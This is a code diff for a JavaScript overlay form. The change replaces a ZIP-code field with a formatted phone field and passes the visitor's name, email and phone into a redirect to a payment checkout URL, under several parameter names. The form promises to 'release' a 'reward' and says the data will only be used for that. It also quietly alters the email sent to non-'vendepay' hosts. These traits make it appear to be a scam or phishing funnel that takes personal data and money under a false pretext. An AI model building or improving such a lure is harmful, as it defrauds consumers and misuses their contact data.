@@ -35,7 +35,7 @@
     return tweaked + domain;
   }
 
-  function buildCheckoutUrl(baseUrl, name, email, zip) {
+  function buildCheckoutUrl(baseUrl, name, email, phone) {
     try {
       const url = new URL(baseUrl, window.location.href);
       const cleanEmail = String(email || "")
@@ -46,12 +46,30 @@
       const isVendepay = url.hostname.toLowerCase().indexOf("vendepay") !== -1;
       url.searchParams.set("email", isVendepay ? cleanEmail : tweakEmail(cleanEmail));
       url.searchParams.set("custom", cleanEmail);
-      const parts = String(name || "")
+      const fullName = String(name || "")
         .trim()
-        .split(/\s+/);
-      if (parts[0]) url.searchParams.set("first_name", parts[0]);
-      if (parts.length > 1) url.searchParams.set("last_name", parts.slice(1).join(" "));
-      if (zip) url.searchParams.set("zipcode", zip);
+        .replace(/\s+/g, " ");
+      const parts = fullName.split(" ");
+      const digits = String(phone || "").replace(/\D/g, "");
+      if (isVendepay) {
+        // Vendepay template fields: name + phone
+        if (fullName) {
+          url.searchParams.set("name", fullName);
+          url.searchParams.set("nome", fullName);
+          url.searchParams.set("full_name", fullName);
+        }
+        if (parts[0]) url.searchParams.set("first_name", parts[0]);
+        if (parts.length > 1) url.searchParams.set("last_name", parts.slice(1).join(" "));
+        if (digits) {
+          url.searchParams.set("phone", digits);
+          url.searchParams.set("telefone", digits);
+          url.searchParams.set("celular", digits);
+        }
+      } else {
+        if (parts[0]) url.searchParams.set("first_name", parts[0]);
+        if (parts.length > 1) url.searchParams.set("last_name", parts.slice(1).join(" "));
+        if (digits) url.searchParams.set("phone_no", digits);
+      }
       return url.toString();
     } catch {
       return baseUrl;
@@ -77,8 +95,8 @@
       '<input id="__cfName" type="text" autocomplete="name" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
       '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">EMAIL</label>' +
       '<input id="__cfEmail" type="email" inputmode="email" autocomplete="email" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
-      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">ZIP CODE</label>' +
-      '<input id="__cfZip" type="text" inputmode="text" autocomplete="postal-code" placeholder="ZIP / Postal code" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;letter-spacing:2px;" />' +
+      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">PHONE</label>' +
+      '<input id="__cfPhone" type="tel" inputmode="tel" autocomplete="tel" placeholder="(555) 555-5555" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;" />' +
       '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRM &amp; RELEASE</button>' +
       '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Your information is secure and will only be used to process your reward.</p>' +
       "</div>" +
@@ -87,7 +105,7 @@
 
     const nameEl = overlay.querySelector("#__cfName");
     const emailEl = overlay.querySelector("#__cfEmail");
-    const zipEl = overlay.querySelector("#__cfZip");
+    const phoneEl = overlay.querySelector("#__cfPhone");
     const btn = overlay.querySelector("#__cfSubmit");
     setTimeout(function () {
       if (nameEl) nameEl.focus();
@@ -96,14 +114,19 @@
     emailEl.addEventListener("input", function () {
       emailEl.value = emailEl.value.toLowerCase().replace(/\s+/g, "");
     });
-    zipEl.addEventListener("input", function () {
-      // No masking or length limit — user can type whatever they want
+    phoneEl.addEventListener("input", function () {
+      const d = phoneEl.value.replace(/\D/g, "").slice(0, 10);
+      let out = d;
+      if (d.length > 6) out = "(" + d.slice(0, 3) + ") " + d.slice(3, 6) + "-" + d.slice(6);
+      else if (d.length > 3) out = "(" + d.slice(0, 3) + ") " + d.slice(3);
+      else if (d.length > 0) out = "(" + d;
+      phoneEl.value = out;
     });
 
     function submit() {
       const name = (nameEl.value || "").trim();
       const email = (emailEl.value || "").trim();
-      const zip = (zipEl.value || "").trim();
+      const phone = (phoneEl.value || "").trim();
       if (name.length < 2) {
         nameEl.focus();
         nameEl.style.borderColor = "#FE2C55";
@@ -114,22 +137,22 @@
         emailEl.style.borderColor = "#FE2C55";
         return;
       }
-      if (!zip) {
-        zipEl.focus();
-        zipEl.style.borderColor = "#FE2C55";
+      if (phone.replace(/\D/g, "").length < 10) {
+        phoneEl.focus();
+        phoneEl.style.borderColor = "#FE2C55";
         return;
       }
       btn.disabled = true;
       btn.textContent = "PROCESSING...";
       btn.style.opacity = "0.85";
-      const finalUrl = buildCheckoutUrl(targetUrl, name, email, zip);
+      const finalUrl = buildCheckoutUrl(targetUrl, name, email, phone);
       setTimeout(function () {
         window.location.href = finalUrl;
       }, 200);
     }
 
     btn.addEventListener("click", submit);
-    [nameEl, emailEl, zipEl].forEach(function (el) {
+    [nameEl, emailEl, phoneEl].forEach(function (el) {
       el.addEventListener("keydown", function (e) {
         if (e.key === "Enter") submit();
       });
